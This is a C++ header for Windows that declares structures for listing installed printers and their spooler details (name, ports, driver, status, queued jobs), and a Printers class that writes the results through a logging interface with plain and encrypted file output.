#include "Includes.h"
#include "Logs.h"
#include <winspool.h>
#pragma once

//Documentations to read :
//https://docs.microsoft.com/en-us/windows/win32/printdocs/printing-and-print-spooler-functions

struct PrinterInformations {

	//Operator << to print our PrinterInformations dae right waey !
	friend std::ostream& operator<<(std::ostream& outputStream, const PrinterInformations& c) {
		outputStream << "Printer Name : " << c.PrinterName << std::endl;
		outputStream << "Default Printer : " << (c.DefaultPrinter == true ? "TRUE" : "FALSE") << std::endl;
		outputStream << "Share Name : " << c.PrinterShareName << std::endl;
		outputStream << "Ports : " << c.PrinterPorts << std::endl;
		outputStream << "DriverName : " << c.PrinterDriverName << std::endl;
		outputStream << "Comment : " << c.PrinterComment << std::endl;
		outputStream << "Location : " << c.PrinterLocation << std::endl;
		outputStream << "Processor : " << c.PrinterProcessor << std::endl;
		outputStream << "Status : " << c.PrinterStatus << std::endl;
		outputStream << "Current Jobs : " << c.PrintercJobs << std::endl;
		outputStream << "Printer Priority : " << c.PrinterPriority << std::endl;
		outputStream << "Printer Average Print Per Minute : " << c.PrinterAveragePM << std::endl << std::endl;
		return outputStream;
	}
	std::string PrinterName; //Name of the printer
	
	std::string PrinterShareName; //Share name of the printer (Usually none if there is no active directory)
	
	std::string PrinterPorts; //A pointer to a null-terminated string that identifies the port(s) used to transmit 
							  //data to the printer. If a printer is connected to more than one port, the names of 
							  //each port must be separated by commas (for example, "LPT1:,LPT2:,LPT3:").
	
	std::string PrinterDriverName; //A pointer to a null-terminated string that specifies the name of the printer driver.
	
	std::string PrinterComment; //A pointer to a null-terminated string that provides a brief description of the printer.
	
	std::string PrinterLocation; //A pointer to a null-terminated string that specifies the physical location of the printer (for example, "Bldg. 38, Room 1164").
	
	std::string PrinterProcessor; //A pointer to a null-terminated string that specifies 
								  //the name of the print processor used by the printer.
								  //You can use the EnumPrintProcessors function to obtain a list of 
								  //print processors installed on a server.
	
	DWORD PrinterStatus; //The Printer Status
	
	DWORD PrintercJobs; //The number of print jobs that have been queued for the printer.
	
	DWORD PrinterPriority; //A priority value that the spooler uses to route print jobs.

	DWORD PrinterAveragePM; //The average number of pages per minute that have been printed on the printer.

	bool DefaultPrinter = false; //Is the printer the default one.
};

struct Printers : public Logs {
	//LOGS INTERFACE IMPLEMENTATION
	bool OutputFile(const std::string& message, const std::string& path) override;
	bool OutputEncryptedContent(const std::string& message, const std::string& path) noexcept override;
	//Functions and Members
	std::string DefaultPrinterName;
	std::vector<PrinterInformations> Printers; //Vector of PrinterInformations (Basically our list of printers)
	bool EnumeratePrintersInformation();
};
